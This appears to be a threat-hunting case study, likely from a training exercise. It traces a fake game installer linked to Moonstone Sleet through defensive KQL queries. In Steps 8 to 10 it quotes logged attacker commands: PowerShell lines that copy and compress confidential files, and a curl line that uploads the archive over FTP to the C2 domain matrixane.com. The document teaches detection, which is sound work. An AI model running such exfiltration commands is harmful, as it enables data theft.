# 🎮 DeTankWar Incident: Breach of Project Omega

> A high-stakes cybersecurity case study involving North Korean APT group Moonstone Sleet, malicious gaming software, and the compromise of TitanShield's classified AI defense project.

---

## 🧠 Background: Project Omega

TitanShield was working on **Project Omega**—a revolutionary autonomous defense system. Designed for intelligent threat neutralization, it was the most classified project in the company's arsenal.

But then... one game changed everything.

---

## 🎮 Suspicious Activity Begins

An employee named **James Douglas** downloaded a game named **DeTankWar** after seeing a flashy post. He reported his system slowing down. The security team began the investigation.

---

## 🕵️‍♂️ Step 1: Identify James' Host

```kql
Employees
| where name has "James Douglas"
```
 Hostname: UB9I-DESKTOP

 ---
 ### 🔍 Step 2: Check for Game Installation

I queried the system to see if the suspicious game `DeTankWar` was installed on the device belonging to James Douglas (`UB9I-DESKTOP`).

```kql
FileCreationEvents
| where hostname == "UB9I-DESKTOP"
| where filename has "DeTankWar"
```
✅ Result: Malicious game file was found on the host.

SHA256 for this file is found to be :
56554117d96d12bd3504ebef2a8f28e790dd1fe583c33ad58ccbf614313ead8c
---
## 🧪 Step 3: Analyze in Microsoft Defender XDR

After retrieving the file hash, it was submitted to Microsoft Defender XDR.

- ✅ **Secure Score**: `100`
- ❌ **Verdict**: Malicious
- 🔍 **Threat Actor Identified**: `Moonstone Sleet`

---

## 🌍 Step 4: Threat Actor Profile – Moonstone Sleet

- 🏴 **Origin**: North Korea  
- 🎯 **Targets**: Defense Industrial Base  
- 🎭 **Motivation**: Espionage & Revenue Generation  
- 🔁 **Overlaps With**: Diamond Sleet (Another DPRK threat actor)

---

## 📧 Step 5: Check for Phishing Emails

**Domain Involved**: `detankwar.com`

```kql
Email
| where link has "detankwar.com"
```
✅ 6 phishing emails identified in the environment.

---
## 📬 Step 6: Targeted Employee List

I investigated who among TitanShield employees received phishing emails containing links to the malicious domain.

```kql
Email
| where link has "DeTankWar"
| distinct recipient
```
✅ Result: 6 distinct employees were targeted.

🧑‍💻 Enrich With Employee Details

```kql
Email
| where link has "DeTankWar"
| distinct recipient
| join kind=inner Employees on $left.recipient == $right.email_addr
| distinct email_addr, name, role
```
🎯 Most impacted role: Defense Engineer
---
# 🐛 Step 7: Malware Artifacts Detected

The threat actor deployed multiple known malicious payloads disguised as game components:

- `delfi-tank-unity.exe`  
- `nvunityplugin.dll`  
- `unityplayer.dll`  

```kql
FileCreationEvents
| where filename in~ ("nvunityplugin.dll", "unityplayer.dll")
```
✅ 6 DLLs found on the network.

SHA256: 09d152aa2b6261e3b0a1d1c19fa8032f215932186829cfcca954cc5e84a6cc38

👤 Attribution: Moonstone Sleet
---
## 📡 Step 8: C2 Communication Attempt

Threat intelligence reported the following **Command & Control (C2) domains**:

- `mingeloem[.]com`  
- `matrixane[.]com`  

I investigated outbound command-line usage for suspicious communication attempts involving these domains.

```kql
ProcessEvents
| where process_commandline has "curl"
| where process_commandline has_any ("mingeloem.com", "matrixane.com")
```
✅ Data exfiltration command found:
```
curl -T C:\ReadyToGo\TopSecret.zip ftp://matrixane.com/upload/ --user exfil:tankpass
```
🚨 Critical Finding: Data was being transferred via FTP to an external C2 server controlled by the attacker.
---
## 📦 Step 9: Examine Compressed File

I investigated how the attacker created the archive file `TopSecret.zip`, which contained sensitive data prepared for exfiltration.

```kql
ProcessEvents
| where process_commandline has "TopSecret.zip"
```
✅ PowerShell archive activity detected:
```
Compress-Archive -Path C:\StagingArea\* -DestinationPath C:\ReadyToGo\TopSecret.zip
```
📦 Conclusion: Files from C:\StagingArea were compressed into a .zip archive — an essential stage before data exfiltration.
---
## 📁 Step 10: Reveal What Was Stolen

I investigated file operations involving the staging directory to confirm what was exfiltrated. The attacker copied highly confidential project data in preparation for export.

```kql
ProcessEvents
| where process_commandline has "StagingArea"
```
✅ Payload preparation activity detected:
```
Copy-Item -Path \\company_share\confidential\defense\project_omega\* -Destination C:\StagingArea\ -Recurse
```
---

